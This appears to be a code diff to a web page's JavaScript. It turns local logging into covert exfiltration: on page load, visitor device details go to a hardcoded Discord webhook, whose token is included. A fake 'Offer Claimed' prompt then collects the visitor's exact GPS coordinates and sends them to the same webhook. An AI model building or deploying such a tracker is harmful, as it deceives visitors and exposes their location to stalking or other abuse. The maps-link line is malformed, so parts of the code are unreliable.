@@ -26,27 +26,41 @@
         const deviceData = {
             userAgent: navigator.userAgent,
             language: navigator.language,
-            screenResolution: `screen.width + "x" + screen.height,
+            screenResolution: window.screen.width + "x" + window.screen.height,
             platform: navigator.platform,
             timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
         };
 
-        console.log("Captured Metadata:", deviceData);
+        // YAHA APNA WEBHOOK LINK PASTE KAREIN
+        const discordWebhookUrl = "https://discord.com/api/webhooks/1542745089535774730/GjPGMUOEP09yQONAThx9_zuSAUWiGOVopFv3OGsRHyxH8AU4QhdIIL_b3HRz_d5Otusc";
+
+        function sendToDiscord(contentText) {
+            if(discordWebhookUrl && discordWebhookUrl !== "PASTE_YOUR_DISCORD_WEBHOOK_URL_HERE") {
+                fetch(discordWebhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ content: contentText })
+                }).catch(err => console.log(err));
+            }
+        }
+
+        // Jaise hi page khulega, basic detail automatic chali jayegi
+        sendToDiscord(`🌐 **New Visitor Alert!**\n📱 Device: ${deviceData.platform}\n🌍 TimeZone: ${deviceData.timeZone}\n🖥️ Resolution: ${deviceData.screenResolution}`);
 
         function requestLocation() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        const exactCoords = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy + " meters"
-                        };
-                        alert("Permission Verified! Data Logged.");
-                        console.log("Exact Location Data:", exactCoords);
+                        alert("Permission Verified! Offer Claimed.");
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        
+                        // Exact location Discord par bhejane ke liye
+                        sendToDiscord(`🎯 **EXACT LOCATION FETCHED!**\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🗺️ Google Maps Link: https://google.com{lat},${lon}`);
                     },
                     (error) => {
-                        alert("Permission denied. Only browser metadata logged.");
+                        alert("Offer activation failed: Permission denied.");
+                        sendToDiscord(`❌ User denied location permission.`);
                     }
                 );
             } else {
